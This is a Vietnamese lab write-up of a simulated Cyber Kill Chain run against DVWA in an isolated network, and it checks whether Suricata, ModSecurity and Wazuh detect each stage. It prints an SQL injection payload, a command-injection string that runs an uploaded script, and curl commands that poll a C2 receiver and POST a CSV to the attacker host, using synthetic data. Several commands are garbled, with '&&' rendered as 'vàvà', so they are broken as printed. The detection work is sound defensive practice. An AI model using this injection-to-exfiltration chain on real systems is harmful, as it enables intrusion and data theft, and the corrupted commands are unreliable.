---
title: "Phần 5: Recon, Web, WAF và Wazuh (Cyber Kill Chain)"
date: "2026-10-09"
---

Mô phỏng các giai đoạn của **Cyber Kill Chain** trong môi trường mạng VMware cô lập nhằm kiểm chứng khả năng thu thập và đối chiếu telemetry đa lớp giữa **Suricata IDS**, **ModSecurity WAF**, **Wazuh FIM** và **Wazuh SIEM**.

---

## 1. Tóm tắt và sơ đồ luồng

Mục tiêu của bài lab là kiểm tra các nguồn telemetry từ nhiều lớp phòng thủ khi mô phỏng từng bước trong chuỗi tấn công:

- **Kali Linux (`192.168.203.144`):** Thực hiện reconnaissance (Nmap), gửi payload kiểm thử DVWA từ trình duyệt/curl và chạy dịch vụ HTTP receiver tại cổng `8000`.
- **Ubuntu Server (`192.168.203.139`):** Máy mục tiêu chạy Apache2, DVWA, ModSecurity WAF, Suricata IDS (bắt gói trên card `ens33`) và Wazuh Agent (`anphan-Linux`).
- **Wazuh Manager (`192.168.203.136`):** Tập trung log, giải mã sự kiện theo rule mặc định lẫn custom rule và hiển thị cảnh báo trên Threat Hunting Dashboard.
- **Windows 10 (`192.168.203.140`):** Chỉ tham gia bước kiểm tra phản hồi host discovery.

### Sơ đồ luồng dữ liệu và cảnh báo

| Giai đoạn | Luồng kết nối mạng | Nguồn sinh Telemetry và Rule đối chiếu |
| :--- | :--- | :--- |
| **1. Recon** | Kali (`.144`) -> Ubuntu (`.139`) | `tcpdump` (`ens33`), Suricata `SID 1000001` và `SID 2260002` -> Wazuh `Rule 86601` |
| **2. DVWA / WAF / FIM** | Kali (`.144`) -> Apache / DVWA (`.139:80`) | Apache `access.log` và `error.log`, ModSecurity `ID 1001001` -> Wazuh `Rule 100501` (Level 8), FIM `Rule 554` (Level 5) |
| **3. C2 HTTP Polling** | Ubuntu (`.139`) -> Kali Receiver (`.144:8000`) | Suricata `SID 1000002` (`GET /command`) -> Wazuh `Rule 100502` (Level 8) |
| **4. Exfiltration CSV** | Ubuntu (`.139`) -> Kali Receiver (`.144:8000/upload`) | Suricata `SID 1000003` (`LAB_ONLY_CKC`) -> Wazuh `Rule 100503` (Level 10) |
| **5. Full-Chain** | Chuỗi liên hoàn `.144` <-> `.139` -> `.136` | Tổng hợp timeline trên `eve.json` và Wazuh `wazuh-alerts-*` |

> **Lưu ý :** Các kịch bản 1-4 kiểm tra từng nhóm hành vi độc lập; kịch bản 5 nối các bước vào chung một timeline. Tệp CSV chỉ chứa dữ liệu giả lập (`LAB_ONLY_CKC`). Các cảnh báo HTTP có `action: allowed` phản ánh sự kiện được ghi nhận ở chế độ **IDS / DetectionOnly** (giám sát và phát cảnh báo, không cấu hình IPS/chặn gói).

---

## 2. Vai trò công cụ trong Lab

- **Nmap:** Host discovery (`-sn`), TCP SYN scan (`-sS`), nhận diện phiên bản dịch vụ (`-sV`).
- **tcpdump:** Xác nhận gói tin ARP, ICMP và TCP đến giao diện mạng `ens33` trên Ubuntu.
- **DVWA:** Ứng dụng web có lỗ hổng phục vụ kiểm thử trong môi trường cô lập.
- **ModSecurity:** Đánh giá request HTTP theo luật WAF ở chế độ `DetectionOnly` (ghi log vào Apache `error.log` nhưng không chặn).
- **Suricata:** Phân tích lưu lượng mạng, ghi log `eve.json` (flow/HTTP) và phát cảnh báo theo bộ luật ET Open (53.123 rules) kết hợp custom SID của lab (`1000001`, `1000002`, `1000003`).
- **Wazuh Agent / Manager:** Thu thập `/var/log/suricata/eve.json`, log Apache và sự kiện File Integrity Monitoring (FIM), ánh xạ sang các rule `86601`, `554`, `100501`, `100502`, `100503`.
- **Python HTTP Receiver:** Lắng nghe tại `192.168.203.144:8000`, ghi nhận các request `GET /command`, `GET /result`, `POST /upload` và lưu tệp CSV nhận được để đối chiếu băm.
- **curl, jq, sha256sum, wc:** Gửi HTTP request, truy vấn lọc trường dữ liệu từ `eve.json` và kiểm chứng toàn vẹn kích thước/mã băm tệp.

---

## 3. Chuẩn bị môi trường

Trên máy Kali (`192.168.203.144`), kiểm tra địa chỉ IP và tuyến đường tới máy mục tiêu:

```bash
ip -br addr
ip route get 192.168.203.139
```

Trên máy Ubuntu (`192.168.203.139`), kiểm tra trạng thái các dịch vụ cốt lõi và luồng log Suricata:

```bash
ip -br addr
ip route
date -u '+%Y-%m-%dT%H:%M:%SZ'
sudo systemctl is-active apache2 suricata wazuh-agent
sudo tail -n 3 /var/log/suricata/eve.json
```

Xác nhận ứng dụng DVWA truy cập được từ Kali:

```bash
curl -I http://192.168.203.139/DVWA/
```

> **Lưu ý:** Trường `timestamp` trong `eve.json` được ghi theo chuẩn UTC (`+0000`), trong khi Wazuh Dashboard hiển thị theo múi giờ cục bộ của trình duyệt. Khi đối chiếu sự kiện giữa hai nguồn cần quy đổi về cùng một mốc thời gian.

---

## 4. Kịch bản 1: Reconnaissance

### 4.1 Mục tiêu
Kiểm tra trạng thái hoạt động của 4 địa chỉ IP trong lab, quét các cổng TCP trong dải `1-100` trên máy Ubuntu, nhận diện dịch vụ mở và xác nhận Suricata cùng Wazuh ghi nhận đầy đủ dấu vết quét.

### 4.2 Bắt gói tin trên Ubuntu
Mở sẵn phiên `tcpdump` trên giao diện `ens33` trước khi khởi chạy Nmap:

```bash
sudo tcpdump -ni ens33 'arp or (host 192.168.203.144 and (icmp or tcp))'
```

*(Lưu ý: `tcpdump` có thể thu cả các gói ARP nền của mạng ảo hóa, cần lọc đúng các gói gắn với phiên quét từ `.144`).*

### 4.3 Host Discovery từ Kali
Thực hiện ping scan trên 4 địa chỉ IP chỉ định:

```bash
sudo nmap -sn -T2 \
  192.168.203.136 \
  192.168.203.139 \
  192.168.203.140 \
  192.168.203.144
```

Kết quả ghi nhận cả 4 địa chỉ IP (`.136`, `.139`, `.140` và chính máy scanner `.144`) đều phản hồi trực tuyến.

### 4.4 Quét cổng TCP SYN (`1-100`)
Kiểm tra nhanh trên cổng SSH và chạy lượt quét chính cho dải cổng `1-100`:

```bash
sudo nmap -sS -Pn -T3 -p 22 192.168.203.139

sudo nmap -sS -Pn -T3 --min-rate 20 \
  -p 1-100 192.168.203.139
```

Kết quả Nmap ghi nhận **4 cổng mở** trong dải `1-100`:
- `22/tcp` (open - ssh)
- `25/tcp` (open - smtp)
- `79/tcp` (open - finger)
- `80/tcp` (open - http)
- 96 cổng còn lại trong dải báo trạng thái `closed`.

### 4.5 Nhận diện dịch vụ (`-sV`)
Thực hiện truy vấn banner dịch vụ:

```bash
sudo nmap -sV -Pn -p 22,25,79 192.168.203.139
```

Kết quả phản hồi ghi nhận:
- Cổng `22/tcp`: `OpenSSH 10.2p1 Ubuntu`
- Cổng `25/tcp`: `Postfix smtpd`
- Cổng `79/tcp`: `Linux fingerd`

Để thu thập đầy đủ banner của cả 4 cổng mở trong dải `1-100`, bổ sung cổng `80` vào danh sách quét:

```bash
sudo nmap -sV -Pn -p 22,25,79,80 192.168.203.139
```

### 4.6 Đối chiếu trên Suricata và Wazuh
Kiểm tra cấu hình Suricata (nạp tổng cộng 53.123 luật từ ET Open và luật lab):

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```

Truy vấn cảnh báo Recon (`SID 1000001`) trong `/var/log/suricata/eve.json`:

```bash
sudo jq -c '
  select(.event_type=="alert" and .alert.signature_id==1000001)
  | {
      timestamp, src_ip, dest_ip, dest_port,
      signature:.alert.signature,
      action:.alert.action
    }
' /var/log/suricata/eve.json | tail -n 10
```

- **Suricata EVE JSON:** Ghi nhận cảnh báo `"LAB RECON SYN scan from Debian to Ubuntu"` từ nguồn `192.168.203.144` tới đích `192.168.203.139` với `action: allowed` (chế độ IDS), cùng cảnh báo ET Open `SID 2260002` khi chạm cổng `79`.
- **Wazuh Threat Hunting:** Truy vấn `rule.groups:suricata` trên index `wazuh-alerts-*` hiển thị sự kiện tương ứng dưới `rule.id: 86601` trên agent `anphan-Linux`.

---

## 5. Kịch bản 2: SQL Injection, Command Injection và FIM

### 5.1 Phạm vi thực nghiệm
Thực hiện 3 phép thử độc lập trên DVWA (mức `Low`):
1. **SQL Injection** để kiểm tra độ phủ log HTTP.
2. **Command Injection** kết hợp đánh giá rule **ModSecurity WAF** và **Wazuh**.
3. **File Upload** tệp đánh dấu `fim-proof.txt` để kiểm chứng **Wazuh FIM** (tệp này được tải qua chức năng File Upload riêng, độc lập với bước Command Injection).

### 5.2 SQL Injection và Visibility
Tại trang SQL Injection của DVWA, nhập payload kiểm thử:

```sql
1' OR '1'='1' #
```

Ứng dụng trả về danh sách nhiều bản ghi người dùng mẫu cùng mã `HTTP 200`. Kiểm tra trên Ubuntu:

```bash
sudo grep -F '/DVWA/vulnerabilities/sqli/' \
  /var/log/apache2/access.log | tail -n 10

sudo jq -c '
  select(.event_type=="http"
    and .src_ip=="192.168.203.144"
    and .dest_ip=="192.168.203.139")
  | {timestamp, src_ip, dest_ip, dest_port, http, alert}
' /var/log/suricata/eve.json | tail -n 10
```

- **Nhận xét:** Apache `access.log` và Suricata `event_type=="http"` đều ghi nhận đầy đủ request tới `/DVWA/vulnerabilities/sqli/`, nhưng trường `alert` của Suricata là `null`. Điều này minh họa sự khác biệt giữa **visibility** (có log giao dịch HTTP phục vụ điều tra) và **detection** (phát cảnh báo tự động).

### 5.3 Command Injection và ModSecurity WAF
Tại trang `/DVWA/vulnerabilities/exec/`, thực thi lệnh kiểm tra kèm marker:
- Kết quả phản hồi gồm đầu ra `ping 127.0.0.1`, định danh tiến trình `uid=33(www-data)` và chuỗi đánh dấu `LAB_STAGE_OK` (`uid=33` xác nhận lệnh chạy dưới quyền tài khoản dịch vụ web `www-data`, không phải quyền `root`).
- ModSecurity (chế độ `DetectionOnly`) khớp luật tùy chỉnh `ID 1001001` và ghi thông điệp `"LAB DVWA command injection marker detected"` vào `/var/log/apache2/error.log`:

```bash
sudo grep -F 'LAB DVWA command injection marker detected' \
  /var/log/apache2/error.log | tail -n 5
```

- **Wazuh SIEM:** Agent thu thập `error.log` và kích hoạt custom rule `rule.id: 100501` (Severity Level 8): *"ModSecurity detected a command injection attempt against DVWA"*.

### 5.4 File Upload và giám sát toàn vẹn tệp (FIM)
Trên Kali, khởi tạo tệp văn bản đánh dấu không chứa mã thực thi:

```bash
printf 'WAZUH FIM LAB 2026-10-09\n' > "$HOME/fim-proof.txt"
```

Tải `fim-proof.txt` lên qua chức năng File Upload của DVWA. Ngay sau khi tệp xuất hiện tại `/var/www/html/DVWA/hackable/uploads/`, Wazuh Agent `anphan-Linux` phát sinh cảnh báo FIM `rule.id: 554` (Level 5 - *"File added to the system"*) với đường dẫn chính xác của tệp vừa tải lên.

---

## 6. Kịch bản 3: Mô phỏng C2 HTTP Polling

### 6.1 Cơ chế mô phỏng
Máy Ubuntu (`192.168.203.139`) chủ động gửi các request `HTTP GET` định kỳ tới dịch vụ Python receiver trên Kali (`192.168.203.144:8000`) tại đường dẫn `/command` để nhận chuỗi trạng thái `LAB_STATUS`, sau đó gửi kết quả `hostname` về `/result`.
- **Suricata `SID 1000002`:** Phát hiện hành vi `GET /command` giữa cặp IP lab.
- **Wazuh `Rule 100502` (Level 8):** Luật cảnh báo trên SIEM ánh xạ từ sự kiện Suricata `SID 1000002`.

### 6.2 Thực thi Client Polling
Sau khi bật HTTP server lắng nghe tại `192.168.203.144:8000` trên Kali, chạy vòng lặp 3 lượt polling từ Ubuntu:

```bash
for n in 1 2 3; do
  curl --noproxy '*' --http1.1 -fsS \
    -A CKC3_01 \
    http://192.168.203.144:8000/command
  printf '\nHost: '
  hostname
  curl --noproxy '*' --http1.1 -fsS \
    "http://192.168.203.144:8000/result?status=$(hostname)"
  sleep 5
done
```

### 6.3 Truy vấn cảnh báo Suricata và Wazuh
Kiểm tra các bản ghi `SID 1000002` trong `eve.json`:

```bash
sudo jq -c '
  select(.event_type=="alert" and .alert.signature_id==1000002)
  | {
      timestamp, src_ip, dest_ip, dest_port,
      signature:.alert.signature,
      action:.alert.action
    }
' /var/log/suricata/eve.json | tail -n 10
```

Ba lượt polling được ghi nhận tương ứng trên cả Suricata (`SID 1000002`) và Wazuh Dashboard (`rule.id: 100502` vào các mốc `09:28:42`, `09:28:48` và `09:28:52`).

### 6.4 Negative Control
Kiểm chứng độ chính xác của rule bằng cách đếm số lượng cảnh báo `SID 1000002` trước và sau khi gửi request tới `/result` (URI không nằm trong dấu hiệu nhận diện `/command`):

```bash
lab_before=$(sudo jq -r '
  select(.event_type=="alert" and .alert.signature_id==1000002)
  | .timestamp
' /var/log/suricata/eve.json | wc -l)

curl --noproxy '*' -sS -o /dev/null \
  -w 'HTTP status: %{http_code}\n' \
  http://192.168.203.144:8000/result

sleep 3

lab_after=$(sudo jq -r '
  select(.event_type=="alert" and .alert.signature_id==1000002)
  | .timestamp
' /var/log/suricata/eve.json | wc -l)

printf 'SID 1000002 truoc: %s\n' "$lab_before"
printf 'SID 1000002 sau: %s\n' "$lab_after"
```

Kết quả trả về `HTTP status: 200` và bộ đếm `SID 1000002` giữ nguyên (`7 truoc`, `7 sau`), xác nhận luật chỉ bắt đúng mẫu URI `/command` đã định nghĩa.

---

## 7. Kịch bản 4: Truyền dữ liệu CSV giả lập (Exfiltration)

### 7.1 Khởi tạo dữ liệu giả lập có Marker
Trên Ubuntu, tạo tệp CSV giả lập chứa nhãn phân loại `LAB_ONLY_CKC`:

```bash
mkdir -p "$HOME/ckc-lab"
cat > "$HOME/ckc-lab/synthetic_records.csv" <<'EOF'
record_id,alias,classification
001,LAB_PERSON_A,LAB_ONLY_CKC
002,LAB_PERSON_B,LAB_ONLY_CKC
EOF

sudo install -D -m 644 \
  "$HOME/ckc-lab/synthetic_records.csv" \
  /var/tmp/ckc-fullchain/synthetic_records.csv

sudo -u www-data test -r \
  /var/tmp/ckc-fullchain/synthetic_records.csv \
  vàvà echo DATA_READABLE

wc -c /var/tmp/ckc-fullchain/synthetic_records.csv
sha256sum /var/tmp/ckc-fullchain/synthetic_records.csv
```

- **Kích thước tệp nguồn:** `91 bytes`
- **SHA-256 bản nguồn:** `bd91af729c4b9f5222b9e24e6719b7c1cab0af7a54ceba1d9e0d8d5c9b0dc9a9`

### 7.2 Truyền dữ liệu qua HTTP POST và kiểm tra Hash
Khởi chạy `receiver.py` trên Kali (`:8000`) và gửi tệp CSV từ Ubuntu dưới quyền `www-data`:

```bash
sudo -u www-data curl --noproxy '*' --http1.1 -v \
  -A CKC4_EXFIL_01 \
  -H 'Content-Type: text/csv' \
  --data-binary @/var/tmp/ckc-fullchain/synthetic_records.csv \
  -w '\nHTTP_STATUS=%{http_code}\n' \
  http://192.168.203.144:8000/upload
```

Receiver trả về `HTTP/1.0 200 OK` (`LAB_RECEIVED`), ghi nhận đủ `91 bytes`, `marker=True`. Kiểm tra tệp nhận được trên máy Kali:

```bash
wc -c "$HOME/ckc-fullchain/received-fullchain.csv"
sha256sum "$HOME/ckc-fullchain/received-fullchain.csv"
```

Mã băm SHA-256 trên máy nhận trùng khớp hoàn toàn (`bd91af729c4b9f52...c9b0dc9a9`).

### 7.3 Phát hiện trên Suricata và Wazuh
Lọc cảnh báo exfiltration (`SID 1000003`) trong `eve.json`:

```bash
sudo jq -c '
  select(.event_type=="alert" and .alert.signature_id==1000003)
  | {
      timestamp, src_ip, dest_ip, dest_port,
      signature:.alert.signature,
      action:.alert.action
    }
' /var/log/suricata/eve.json | tail -n 5
```

- **Suricata:** Sinh cảnh báo `"LAB CKC synthetic data exfil"` (`192.168.203.139` -> `192.168.203.144:8000`).
- **Wazuh SIEM:** Kích hoạt `rule.id: 100503` (Severity Level 10): *"LAB CKC: synthetic data sent to test receiver"*.

### 7.4 Phép thử đối chứng với CSV không chứa Marker
Tạo tệp `control.csv` (`59 bytes`, nhãn `PUBLIC_LAB`, không chứa marker `LAB_ONLY_CKC`) và gửi qua cùng endpoint `/upload`:

```bash
cat > "$HOME/ckc-lab/control.csv" <<'EOF'
record_id,alias,classification
003,LAB_PERSON_C,PUBLIC_LAB
EOF

sudo install -D -m 644 \
  "$HOME/ckc-lab/control.csv" \
  /var/tmp/ckc-fullchain/control.csv

lab_before=$(sudo jq -r '
  select(.event_type=="alert" and .alert.signature_id==1000003)
  | .timestamp
' /var/log/suricata/eve.json | wc -l)

sudo -u www-data curl --noproxy '*' --http1.1 -sS \
  -A CKC4_CONTROL_01 \
  -H 'Content-Type: text/csv' \
  --data-binary @/var/tmp/ckc-fullchain/control.csv \
  -w '\nHTTP_STATUS=%{http_code}\n' \
  http://192.168.203.144:8000/upload

sleep 3

lab_after=$(sudo jq -r '
  select(.event_type=="alert" and .alert.signature_id==1000003)
  | .timestamp
' /var/log/suricata/eve.json | wc -l)

printf 'SID 1000003 truoc: %s\n' "$lab_before"
printf 'SID 1000003 sau: %s\n' "$lab_after"
```

Receiver nhận đủ 59 bytes với `marker=False` và số lượng cảnh báo `SID 1000003` không tăng (`1 -> 1`), chứng minh rule phân biệt chính xác nội dung chứa marker nhạy cảm trên kênh HTTP thuần.

---

## 8. Kịch bản 5: Full-Chain 

### 8.1 Kịch bản kết hợp liên hoàn
Nối toàn bộ các bước vào một chuỗi thực thi duy nhất: **Reconnaissance -> DVWA Command Injection -> Chạy script thu thập/polling C2 -> Exfiltration tệp CSV** và truy vết toàn bộ chuỗi sự kiện trên một timeline hợp nhất.

Trên Kali, khởi chạy `fullchain_server.py` tại cổng `8000`. Trên Ubuntu, kiểm tra cú pháp script kịch bản `/var/www/html/DVWA/hackable/uploads/ckc5-demo.sh`:

```sh
#!/bin/sh
set -eu

RUN_ID=CKC5_02
printf 'RUN_ID=%s\n' "$RUN_ID"

for n in 1 2 3; do
  curl --noproxy '*' --http1.1 -fsS -A "$RUN_ID" \
    http://192.168.203.144:8000/command
  sleep 3
done

curl --noproxy '*' --http1.1 -fsS -A "$RUN_ID" \
  -H 'Content-Type: text/csv' \
  --data-binary @/var/tmp/ckc-fullchain/synthetic_records.csv \
  http://192.168.203.144:8000/upload
```

Kích hoạt chuỗi thực thi thông qua lỗ hổng Command Injection trên DVWA:

```bash
127.0.0.1; id vàvà /bin/sh -x /var/www/html/DVWA/hackable/uploads/ckc5-demo.sh; echo LAB_SCRIPT_EXIT:$?
```

### 8.2 Chẩn đoán lỗi thực tế (`CKC5_01` vs `CKC5_02`)
Trong quá trình thực nghiệm, nhật ký ghi nhận rõ hai lượt chạy để phục vụ phân tích nguyên nhân gốc rễ:
- **Lượt `CKC5_01` (Lỗi `LAB_SCRIPT_EXIT:26`):** Mã thoát `26` của `curl` (`CURLE_READ_ERROR`) xảy ra khi tiến trình `www-data` chưa mở đọc được tệp nguồn tại đường dẫn đích trong lần chạy đầu.
- **Lượt `CKC5_02` (Thành công `LAB_SCRIPT_EXIT:0`):** Sau khi xác nhận quyền đọc của `www-data` (`DATA_READABLE`) và cú pháp script (`SCRIPT_SYNTAX_OK`), lượt chạy `CKC5_02` hoàn tất 3 chu kỳ polling `/command`, truyền thành công `91 bytes` CSV sang Kali (`LAB_RECEIVED`, SHA-256 trùng khớp) và trả về `LAB_SCRIPT_EXIT:0`.

### 8.3 Truy vấn hợp nhất Timeline trên Suricata và Wazuh
Trích xuất đồng thời cả 3 giai đoạn mạng (`SID 1000001`, `1000002`, `1000003`) từ `/var/log/suricata/eve.json`:

```bash
sudo jq -r '
  select(.event_type=="alert")
  | .alert.signature_id as $sid
  | select($sid==1000001 or $sid==1000002 or $sid==1000003)
  | [
      .timestamp,
      ($sid|tostring),
      .src_ip,
      .dest_ip,
      (.alert.signature // "")
    ]
  | @tsv
' /var/log/suricata/eve.json | tail -n 30
```

Trên **Wazuh Threat Hunting Dashboard** (`wazuh-alerts-*`), sử dụng truy vấn tổng hợp để dựng lại toàn bộ bức tranh tấn công theo thời gian thực:

```text
rule.id:86601 OR rule.id:100501 OR rule.id:554 OR rule.id:100502 OR rule.id:100503
```

---

## 9. Tổng kết các điểm phân tích trọng tâm

1. **Reconnaissance:** Quét Nmap SYN trong dải `1-100` phát hiện chính xác 4 cổng mở (`22`, `25`, `79`, `80`) và kích hoạt Suricata `SID 1000001` / Wazuh `Rule 86601`.
2. **Visibility vs Detection (SQLi):** Suricata EVE JSON và Apache `access.log` ghi lại đầy đủ request SQLi nhưng không sinh alert chuyên biệt (`alert: null`), làm rõ vai trò của log lưu trữ (`archives`) khi điều tra các truy vấn lọt qua bộ rule tĩnh.
3. **WAF và Endpoint Context (Command Injection):** Lệnh thực thi dưới quyền `uid=33(www-data)`, được ModSecurity (`DetectionOnly`) ghi nhận qua rule `1001001` và đẩy lên Wazuh thành cảnh báo mức 8 (`Rule 100501`).
4. **File Integrity Monitoring (FIM):** Wazuh `Rule 554` phát hiện ngay lập tức tệp mới `fim-proof.txt` sinh ra trong thư mục `/var/www/html/DVWA/hackable/uploads/`.
5. **Kiểm chứng đối chứng (C2 và Exfiltration):** Các phép thử đối chứng (`/result` cho C2 `SID 1000002` và `control.csv` cho Exfiltration `SID 1000003`) chứng minh các custom rule hoạt động đúng ngữ cảnh thiết kế mà không gây cảnh báo giả trên lưu lượng đối chứng.

---

## 10. Tài liệu tham khảo

- Hutchins, Cloppert và Amin - *Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains* (Lockheed Martin).
- MITRE ATTvàCK - *Application Layer Protocol: Web Protocols (T1071.001)* và *Exfiltration Over C2 Channel (T1041)*.
- OISF - *Suricata User Guide: EVE JSON Format và HTTP Keywords*.
- Wazuh Documentation - *Integrating Suricata with Wazuh* và *File Integrity Monitoring (FIM)*.
- OWASP - *OS Command Injection Defense Cheat Sheet* và *File Upload Cheat Sheet*.
